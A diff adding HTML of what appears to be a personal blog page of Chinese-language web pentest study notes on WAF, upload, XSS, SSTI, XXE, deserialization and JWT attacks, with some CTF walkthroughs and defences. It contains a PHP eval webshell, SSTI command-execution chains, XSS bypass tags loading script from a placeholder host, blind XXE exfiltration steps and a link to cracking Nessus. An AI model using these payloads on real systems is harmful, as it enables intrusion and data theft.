+<h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><ul>
+<li><pre><code class="mysql">/** ! */  配合参数污染使用↑
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>#### fuzz(脚本跑字典)<br><br>- [fuzz](D:\骚工具\fuzzdb-master)<br>- https:<span class="hljs-comment">//github.com/gh0stkey/Web-Fuzzing-Box/tree/main</span><br><br>#### ip白名单(修改http头)<br><br>- x-forwarded-for<br>- x-remote-IP<br>- x-originating-IP<br>- x-remote-addr<br>- X-<span class="hljs-built_in">Real</span>-ip<br><br>#### 静态资源<br><br>- index.php/x.txt?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><br>#### url白名单<br><br>#### 爬虫白名单<br><br>- 伪装搜索引擎的收录爬虫<br><br>- 用于防止扫描工具误报及访问频率过高被拦截<br><br>- ```<br>  Mozilla/<span class="hljs-number">5.0</span> (compatible; Baiduspider/<span class="hljs-number">2.0</span>; +http:<span class="hljs-comment">//www.baidu.com/search/spider.html)</span><br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h4 id="mysql版本号绕过"><a href="#mysql版本号绕过" class="headerlink" title="mysql版本号绕过"></a>mysql版本号绕过</h4><ul>
+<li>&#x2F;*!50001 select 1,2,3 *&#x2F;  (版本号大于5.0.1执行)</li>
+</ul>
+<h4 id="sqlmap绕过waf"><a href="#sqlmap绕过waf" class="headerlink" title="sqlmap绕过waf"></a>sqlmap绕过waf</h4><ul>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34444097/article/details/82717357">sqlmap的使用 —- 自带绕过脚本tamper</a></p>
+</li>
+<li><p>自行编写脚本  <a href="#disturb">干扰匹配规则</a></p>
+</li>
+<li><p>结合爬虫白名单 <code>--user-agent=&quot;&quot;</code></p>
+</li>
+</ul>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;<br>&lt;script language=&#x27;php&#x27;&gt; @eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><ul>
+<li><p>下载源码到本地并删除js判断脚本</p>
+</li>
+<li><p>抓包改文件名</p>
+</li>
+</ul>
+<h4 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h4><h5 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h5><ul>
+<li>后缀用其他格式替换 如php5 php3</li>
+<li>apache服务器 .htaccess 文件更改执行规则</li>
+<li>大小写 尾部空格符 点绕过 ::$DATA绕过 pphphp</li>
+<li>第三步多次使用 绕 一次过滤</li>
+</ul>
+<h5 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h5><ul>
+<li>MIME信息验证 _FILES[‘upload_file’] [‘type’] &#x3D;&#x3D; ‘image&#x2F;png’</li>
+<li>0x00 %00 截断文件名(建立在地址)</li>
+<li>如果php文件上传处白名单 且存在文件读取函数 如 <code>file_get_comments</code> 且 本地开放的有其他服务(比如redis)，可以利用Phar反序列化 原生类<code>SoupClient</code> 发一个post数据包 且利用CRLF实现任意数据包构造  从而打ssrf</li>
+</ul>
+<h5 id="内容及其他"><a href="#内容及其他" class="headerlink" title="内容及其他"></a>内容及其他</h5><ul>
+<li>图片插入脚本 配合文件包含漏洞</li>
+<li>二次渲染 条件竞争 重复上传同时访问 尝试中断删除操作</li>
+<li>伪造文件夹-&gt;文件上传  &#x2F;upload&#x2F;webshell.php&#x2F;.</li>
+</ul>
+<h5 id="中间件漏洞-搭建平台"><a href="#中间件漏洞-搭建平台" class="headerlink" title="中间件漏洞(搭建平台)"></a>中间件漏洞(搭建平台)</h5><p>​	<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192063.html">Web中间件常见漏洞总结</a></p>
+<ul>
+<li>tomcat  CVE2017-12615</li>
+<li>apache  低版本解析漏洞</li>
+<li>nginx解析漏洞 (无需脚本格式 正常上传 &#x2F;kobe.png&#x2F;0.php)</li>
+</ul>
+<h5 id="编译器漏洞"><a href="#编译器漏洞" class="headerlink" title="编译器漏洞"></a>编译器漏洞</h5><p>​	fuckeditor ckeditor ueditor kindeditor…</p>
+<h4 id="waf绕过-1"><a href="#waf绕过-1" class="headerlink" title="waf绕过"></a>waf绕过<a id="upload_waf"></a></h4><h5 id="参数名"><a href="#参数名" class="headerlink" title="参数名"></a>参数名</h5><ul>
+<li>Content-Disposition:	一般可更改</li>
+<li>name:	表单参数值，不能更改</li>
+<li>filename :文件名，可以更改</li>
+<li>Content-Type:文件MIME，视情况更改</li>
+</ul>
+<h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h5><ul>
+<li>数据溢出</li>
+<li>符号变异 <code>&#39; &quot; ;</code></li>
+<li>数据截断 <code>%00</code> <code>;</code> <code>换行</code></li>
+<li>重复数据</li>
+<li><a href="D:\骚工具\fuzzdb-master">fuzz</a></li>
+</ul>
+<h3 id="XSS跨站漏洞"><a href="#XSS跨站漏洞" class="headerlink" title="XSS跨站漏洞"></a>XSS跨站漏洞</h3><ul>
+<li>分类 反射型、存储型、DOM型</li>
+<li>常见手法 <a target="_blank" rel="noopener" href="https://xss.yt/">平台</a>、工具、代码分析</li>
+<li>⚠也可能为ssti 注意识别</li>
+</ul>
+<h5 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h5><ul>
+<li>beef kali虚拟机装配 </li>
+<li><a href="D:\骚工具\Postman\Postman.exe">postman</a> 改头发送数据包</li>
+<li>burp配合fuzz字典</li>
+<li>xssstrike.py</li>
+</ul>
+<h5 id="httponly绕过-利用平台"><a href="#httponly绕过-利用平台" class="headerlink" title="httponly绕过(利用平台)"></a>httponly绕过(利用平台)</h5><ul>
+<li>表单劫持</li>
+<li>读取浏览器保存信息</li>
+</ul>
+<h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><ul>
+<li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+</li>
+<li><p>闭合标签 插入a标签 使用内置函数(onclick) 大小写防匹配 双写 编码 注释干扰字符</p>
+</li>
+</ul>
+<h5 id="waf绕过-2"><a href="#waf绕过-2" class="headerlink" title="waf绕过"></a>waf绕过<a id="xss_bypass"></a></h5><ul>
+<li>确定是不是ssti</li>
+<li>去除右括号 并对链接加’’ <code>&lt;script src=&#39;a.com/sdfs&#39;</code></li>
+<li>特殊符号干扰 <code>&lt;script src=&#39;a.com/sdfs&#39;#&gt; </code></li>
+<li>标签更换 <code>&lt;a /href=&quot;a.com/sdfs&quot;#&gt;a</code> <code>&lt;img src=&#39;&#39; onerrer=&#39;a.com/sdfs&#39;&gt;</code> </li>
+<li>三重url编码绕过符号编码</li>
+<li>更换提交方式  unicode编码</li>
+<li>fuzz [网站][<a target="_blank" rel="noopener" href="http://www.xssfuzzer.com/fuzzer.html]">www.xssfuzzer.com/fuzzer.html]</a></li>
+</ul>
+<h5 id="安全修复"><a href="#安全修复" class="headerlink" title="安全修复"></a>安全修复</h5><ul>
+<li>httponly</li>
+<li>输入过滤</li>
+<li>输出过滤</li>
+</ul>
+<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><h5 id="出现位置"><a href="#出现位置" class="headerlink" title="出现位置"></a>出现位置</h5><ul>
+<li>有xss的地方，尝试执行表达式或计算式，能给出结果</li>
+</ul>
+<h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><ul>
+<li>模板注入，利用web模板如jinja2,tomado,Django来处理网页交互，用户的输入可以直接添加到页面内容</li>
+</ul>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
+<li><p>php中一般可以直接执行命令</p>
+</li>
+<li><p>python中构造链，一般由 <code>&quot;&quot;.__class__</code> 起手，不断寻找父类或子类来实现文件读写，最后的链一般如下所示</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">68</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">73</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">68</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">73</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><ul>
+<li>请求伪造</li>
+<li>抓数据包测试</li>
+<li>伪造服务器点击 执行js脚本</li>
+<li>burp生成poc</li>
+</ul>
+<h5 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h5><ul>
+<li>随机token</li>
+<li>同源策略referer</li>
+</ul>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><ul>
+<li>通过网站服务器做跳板请求内网地址</li>
+</ul>
+<h5 id="出现点"><a href="#出现点" class="headerlink" title="出现点"></a>出现点</h5><ul>
+<li>分享：通过URL地址分享网页内容</li>
+<li>转码服务（通过URL地址把原地址的网页内容调优，使其适合手机屏幕的浏览）</li>
+<li>在线翻译</li>
+<li>图片加载与下载：通过URL地址加载或下载图片</li>
+<li>图片、文章收藏功能</li>
+<li>未公开的api实现及调用URL的功能</li>
+<li>从URL关键字中寻找</li>
+</ul>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><ul>
+<li>可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；</li>
+<li>攻击运行在内网或本地的有漏洞程序（比如溢出）；</li>
+<li>可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；</li>
+<li>攻击内网或外网有漏洞的Web应用；</li>
+<li>使用file：&#x2F;&#x2F;&#x2F;协议读取本地文件(或其他协议）</li>
+</ul>
+<h3 id="RCE代码及系统命令执行漏洞"><a href="#RCE代码及系统命令执行漏洞" class="headerlink" title="RCE代码及系统命令执行漏洞"></a>RCE代码及系统命令执行漏洞</h3><h5 id="判断系统"><a href="#判断系统" class="headerlink" title="判断系统"></a>判断系统</h5><ul>
+<li>linux</li>
+<li>windows</li>
+</ul>
+<h5 id="可能产生点"><a href="#可能产生点" class="headerlink" title="可能产生点"></a>可能产生点</h5><ul>
+<li>web源码</li>
+<li>中间件</li>
+<li>其他环境</li>
+</ul>
+<h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><ul>
+<li>白盒 【代码审计】</li>
+<li>黑盒 【漏扫工具 公开漏洞 手工看参数或功能点】</li>
+</ul>
+<h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><ul>
+<li>waf</li>
+<li>敏感函数禁用</li>
+<li>变量过滤</li>
+</ul>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含<a id="文件包含漏洞"></a></h4><h5 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h5><ul>
+<li>直接包含</li>
+<li>后缀截断%00</li>
+<li>垃圾数据截断&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.</li>
+<li>可结合文件上传</li>
+<li>⚠filter链实现rce</li>
+</ul>
+<h5 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h5><ul>
+<li>直接在自己网站放后门文件 -&gt; 远程包含后门文件 -&gt; 菜刀 蚁剑链接</li>
+<li>截断</li>
+</ul>
+<h5 id="伪协议流包含"><a href="#伪协议流包含" class="headerlink" title="伪协议流包含"></a><a href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE">伪协议流包含</a></h5><h5 id="黑盒测试思路"><a href="#黑盒测试思路" class="headerlink" title="黑盒测试思路"></a>黑盒测试思路</h5><ul>
+<li>cms漏洞&#x2F;源码分析</li>
+<li>漏扫工具</li>
+</ul>
+<h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><h5 id="找漏洞"><a href="#找漏洞" class="headerlink" title="找漏洞"></a>找漏洞</h5><ul>
+<li>参数值</li>
+<li>功能点</li>
+<li>漏扫工具</li>
+</ul>
+<h5 id="得到目录"><a href="#得到目录" class="headerlink" title="得到目录"></a>得到目录</h5><ul>
+<li>目录扫描工具</li>
+<li>根据可见文件分析</li>
+</ul>
+<h5 id="防过滤"><a href="#防过滤" class="headerlink" title="防过滤"></a>防过滤</h5><ul>
+<li>..&#x2F;..&#x2F;</li>
+<li>%20 %00</li>
+</ul>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><h5 id="nginx目录穿越"><a href="#nginx目录穿越" class="headerlink" title="nginx目录穿越"></a>nginx目录穿越</h5><ul>
+<li>配置别名时出现疏忽</li>
+<li>如配置<code>/etc/download/</code>的别名为<code>/file/ -&gt; /file</code>忘记&#x2F;导致目录穿越</li>
+<li>利用 <code>/file../</code>可跳转到上层目录 <code>/etc/download/../</code> 即 <code>/etc</code></li>
+</ul>
+<h5 id="java-WEB"><a href="#java-WEB" class="headerlink" title="java WEB"></a>java WEB</h5><ul>
+<li>webinf&#x2F;web.xml 存放信息</li>
+<li>参数用POST传递</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mrs_H/article/details/119576821">WEB-INF&#x2F;web.xml泄露漏洞及其利用</a></li>
+</ul>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><ul>
+<li>一般借助类的某些方法辅助实现</li>
+<li>结合RCE(代码执行)等漏洞使用</li>
+</ul>
+<h5 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h5><ul>
+<li>将对象转换成字符串(序列化)<code>serialize()</code></li>
+<li>反序列化<code>unserialize()</code></li>
+<li>类对象序列化再反序列化时会调用苏醒函数<code>__wakeup()</code></li>
+<li>创建类时调用构造函数<code>__construct()</code></li>
+<li>类对象被echo或当作字符串操作时会调用<code>__toString()</code></li>
+</ul>
+<h5 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h5><ul>
+<li>有多个类，他们的魔术方法可以起到不同作用，此时需要分析入口和出口函数，不断地构建对象，对象的属性互为其他对象，以此来达到链式调用的结果</li>
+</ul>
+<h5 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h5><ul>
+<li>如果函数里没有 <code>unserialize</code> 函数，但是又存在反序列化漏洞或可以构造pop链，就可以尝试利用phar来进行反序列化，原理为phar格式的压缩包数据内容为序列化格式存储，在利用某些函数调用phar格式的文件时，会自动进行反序列化</li>
+</ul>
+<h5 id="php反序列化字节逃逸"><a href="#php反序列化字节逃逸" class="headerlink" title="php反序列化字节逃逸"></a>php反序列化字节逃逸</h5><ul>
+<li>常存在于存在过滤的情况，由于序列化后的数据内容中值的长度是由数字唯一确定的，，那么进行长度不对等的过滤替换后，会在在原来的序列传中截取出新的串，从而实现我们想要执行的某些结果(比如控制一些无法控制的值)</li>
+</ul>
+<h5 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h5><ul>
+<li><p>工具<code>ysoserial</code></p>
+<h6 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h6><ul>
+<li>黑盒看参数 以<code>rO0AB(base64) 或 aced(base16)</code> 开头</li>
+<li>白盒找<code>readobject() writeobject</code></li>
+</ul>
+</li>
+<li><p>利用 反弹shell RCE 弹计算器(bushi)</p>
+</li>
+</ul>
+<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><code>xml external entity injection </code>xml外部实体注入漏洞</p>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul>
+<li>文件读取</li>
+<li>代码执行</li>
+<li>内网攻击</li>
+<li>DOS攻击</li>
+</ul>
+<h4 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h4><h5 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h5><ul>
+<li>函数及可控变量查找</li>
+<li>传输和储存数据格式类型</li>
+</ul>
+<h5 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h5><ul>
+<li>更改content-Type 为 application&#x2F;xml 看是否接受</li>
+</ul>
+<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><h5 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h5><ul>
+<li>协议 <code>http file</code></li>
+<li>引入外部实体</li>
+</ul>
+<h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><ul>
+<li>读取指定内容 base64编码后 赋值给<code>file</code></li>
+<li>访问远程地址的 <code>test.dtd</code>文件</li>
+<li>test.dtd 内写有 带参数<code>?data=%file</code> 访问自己的网站</li>
+<li>查看网站的日志得到  file 内容</li>
+</ul>
+<h4 id="实战-vulnhub-xxe"><a href="#实战-vulnhub-xxe" class="headerlink" title="实战(vulnhub&#x2F;xxe)"></a>实战(vulnhub&#x2F;xxe)</h4><ul>
+<li>下载镜像文件</li>
+<li>打开发现需要登陆密码</li>
+<li>用主机开nmap扫到80端口</li>
+<li>进去看到ubuntu欢迎界面</li>
+<li>dirsearch扫目录得到rebots.txt</li>
+<li>rebots.txt里看到&#x2F;xxe目录</li>
+<li>访问&#x2F;xxe 看到登录框</li>
+<li>任意文件读取读到&#x2F;xxe&#x2F;admin.php源码</li>
+<li>从源码中得到账号密码登录</li>
+<li>得到flag网址(假) 打不开</li>
+<li>任意文件读取假的flag网址得到base32字符串</li>
+<li>base32 base64解码得到真正的flag地址 &#x2F;etc&#x2F;.flag</li>
+<li>base64解码 得到一串混淆过的php源码</li>
+<li>在线运行 报错 得到flag</li>
+</ul>
+<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><ul>
+<li>禁用外部实体</li>
+<li>过滤用户提交的xml数据</li>
+<li>装waf</li>
+</ul>
+<h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><h4 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><ul>
+<li>javascript类&#x2F;对象存在一个<strong>原型对象</strong>，构造函数的 <code>prototype</code> 就等于实例化对象的 <code>__proto__</code> ，也就是说，修改一个对象的 <code>__proto__</code> 的属性，就会修改这个对象的原型对象的属性</li>
+<li>javascript对象的属性具有<strong>向上继承</strong>的特性，如果一个对象并不具有某个属性，那么在调用这个属性的时候便会向<strong>原型对象</strong>的属性去寻找，<strong>依次往上</strong>直到找到属性或null</li>
+<li>利用以上两点，便可以实现以下功能：修改 a 对象的<strong>原型对象</strong>，使 b 对象的某个属性值发生变化，即<strong>如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</strong></li>
+</ul>
+<h5 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h5><ul>
+<li>存在不安全的对象递归合并(merge)</li>
+</ul>
+<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><ul>
+<li>newstar2023 week3 okjigirl</li>
+</ul>
+<h2 id="逻辑问题"><a href="#逻辑问题" class="headerlink" title="逻辑问题"></a>逻辑问题</h2><h3 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h3><h4 id="逻辑越权"><a href="#逻辑越权" class="headerlink" title="逻辑越权"></a>逻辑越权</h4><h5 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h5><ul>
+<li>依赖于数据包 查看、修改同级别用户的信息</li>
+</ul>
+<h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><ul>
+<li>下载源码或自行构造管理员命令数据包</li>
+<li>使用普通用户的身份证明替换管理员身份证明 仍然可以执行管理员功能</li>
+</ul>
+<h4 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h4><h5 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h5><ul>
+<li>身份不同只有看到的代码不同，实现功能的部分没有做验证</li>
+</ul>
+<h4 id="工具使用-1"><a href="#工具使用-1" class="headerlink" title="工具使用"></a>工具使用</h4><ul>
+<li>中通检测工具</li>
+<li>secson-check</li>
+<li>burp插件 authz</li>
+</ul>
+<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><ul>
+<li>前后端同时验证</li>
+<li>每个功能点都验证权限</li>
+<li>加密</li>
+<li>过滤参数</li>
+</ul>
+<h3 id="登录脆弱"><a href="#登录脆弱" class="headerlink" title="登录脆弱"></a>登录脆弱</h3><h4 id="账号密码爆破"><a href="#账号密码爆破" class="headerlink" title="账号密码爆破"></a>账号密码爆破</h4><ul>
+<li>明文传输</li>
+<li>加密传输</li>
+</ul>
+<h4 id="cookie脆弱"><a href="#cookie脆弱" class="headerlink" title="cookie脆弱"></a>cookie脆弱</h4><ul>
+<li>源码审计</li>
+<li>手动看登陆后的cookie</li>
+</ul>
+<h3 id="数据篡改-支付漏洞"><a href="#数据篡改-支付漏洞" class="headerlink" title="数据篡改(支付漏洞)"></a>数据篡改(支付漏洞)</h3><h4 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h4><ul>
+<li>订单号</li>
+<li>商品数量、单价</li>
+<li>支付接口</li>
+<li>支付状态</li>
+</ul>
+<h4 id="常见修改方法"><a href="#常见修改方法" class="headerlink" title="常见修改方法"></a>常见修改方法</h4><ul>
+<li>替换支付</li>
+<li>重复支付</li>
+<li>最小额支付</li>
+<li>负数支付</li>
+<li>溢出支付</li>
+<li>优惠券支付</li>
+</ul>
+<h3 id="找回绕过"><a href="#找回绕过" class="headerlink" title="找回绕过"></a>找回绕过</h3><h4 id="验证和操作不同时"><a href="#验证和操作不同时" class="headerlink" title="验证和操作不同时"></a>验证和操作不同时</h4><ul>
+<li>直接操作绕过验证</li>
+</ul>
+<h4 id="前端验证-1"><a href="#前端验证-1" class="headerlink" title="前端验证"></a>前端验证</h4><ul>
+<li>burp抓返回包 修改返回值</li>
+<li>后端验证则无效</li>
+</ul>
+<h3 id="token-验证码"><a href="#token-验证码" class="headerlink" title="token 验证码"></a>token 验证码</h3><h4 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h4><ul>
+<li>客户端回显(数据包直接能看到)</li>
+<li>验证码复用</li>
+<li>验证码爆破(工具 pkavhttpfuzzer 插件 reCAPTCHA captcha-killer)</li>
+<li>绕过</li>
+</ul>
+<h4 id="token"><a href="#token" class="headerlink" title="token"></a>token</h4><ul>
+<li>爆破(识别或猜测出加密方法)</li>
+<li>回显(下一token在response中可以看到 利用burp正则匹配自动填写)</li>
+</ul>
+<h2 id="JAVA-安全"><a href="#JAVA-安全" class="headerlink" title="JAVA 安全"></a>JAVA 安全</h2><h4 id="javascript原型链污染"><a href="#javascript原型链污染" class="headerlink" title="javascript原型链污染"></a>javascript原型链污染</h4><h4 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h4><ul>
+<li>session注入</li>
+<li>利用预编译防止注入(解决大部分问题)</li>
+<li>绕过预编译↑ <code>case when</code> 要求 数据按某项元素排序且改列名可控 <code>order by + column</code></li>
+</ul>
+<h3 id="JWT安全"><a href="#JWT安全" class="headerlink" title="JWT安全"></a>JWT安全</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/120579337">JWT攻击手册(附jwt_tool用法,爆破弱密钥等)</a></li>
+<li>json web token 跨域验证身份的方案</li>
+<li>不加密传输的数据，但能通过数字签名来验证数据未被篡改、</li>
+</ul>
+<h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><ul>
+<li>头(base64) 存储加密方式</li>
+<li>声明(base64) 存储数据</li>
+<li>签名(头部的加密方式结合密匙)</li>
+</ul>
+<h4 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h4><ul>
+<li>有密匙的话直接解 无密匙往下走</li>
+<li>直接将头部加密方式设为 none</li>
+<li>失效时间改为靠后</li>
+<li>删除签名部分</li>
+<li>修改可能被url编码的符号<code>+变- /变_ =去掉</code></li>
+</ul>
+<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><ul>
+<li>拿到令牌token 解码出加密方式和声明内容</li>
+<li>通过脚本完成以下内容</li>
+<li>批量跑字典来通过指定的加密方式加密内容</li>
+<li>比对得到的签名base64编码后和原始签名是否一致</li>
+<li>当匹配到一致后则输出该密匙</li>
+</ul>
+<h3 id="其他漏洞的java形式"><a href="#其他漏洞的java形式" class="headerlink" title="其他漏洞的java形式"></a>其他漏洞的java形式</h3><h4 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h4><ul>
+<li>任意目录覆盖上传</li>
+<li>绕过目录解析，执行脚本</li>
+</ul>
+<h4 id="不安全登录"><a href="#不安全登录" class="headerlink" title="不安全登录"></a>不安全登录</h4><ul>
+<li>账号密码可直接在js获得</li>
+</ul>
+<p>…</p>
+<ul>
+<li>⚠javaWeb的参数不以参数名识别，只与传参顺序有关</li>
+</ul>
+<h4 id="app安全"><a href="#app安全" class="headerlink" title="app安全"></a>app安全</h4><ul>
+<li>一键反编译</li>
+<li>漏了个大洞</li>
+</ul>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h3 id="系统漏洞"><a href="#系统漏洞" class="headerlink" title="系统漏洞"></a>系统漏洞</h3><h4 id="探针工具"><a href="#探针工具" class="headerlink" title="探针工具"></a>探针工具</h4><ul>
+<li><p>Goby(界面友好，快速)[<a href="https://gobies.org]">https://gobies.org]</a></p>
+</li>
+<li><p>Nmap(支持自定义插件)</p>
+<h5 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h5><ul>
+<li>全面 高效 </li>
+<li>需要自行开启Tanable Nessus服务后在浏览器端使用</li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/350938.html">Nessus 离线破解更新插件教程</a></li>
+</ul>
+</li>
+<li><p>OpenVAS</p>
+</li>
+<li><p>Nexpose</p>
+</li>
+</ul>
+<h4 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h4><ul>
+<li>远程代码执行</li>
+<li>权限提升</li>
+<li>缓冲区溢出</li>
+<li>…</li>
+</ul>
+<h4 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h4><h5 id="工具框架"><a href="#工具框架" class="headerlink" title="工具框架"></a>工具框架</h5><ul>
+<li>渗透测试工具Metasploit  -&gt; kali和忍者上装载的msfconsole</li>
+<li>Searchsploit 漏洞查找工具</li>
+<li>企业单位内部产品</li>
+</ul>
+<p>​	一般利用searchsploit或者直接在探针工具上找到漏洞对应编号 利用msf进行测试</p>
+<h5 id="单点Exp"><a href="#单点Exp" class="headerlink" title="单点Exp"></a>单点Exp</h5><ul>
+<li>cmd</li>
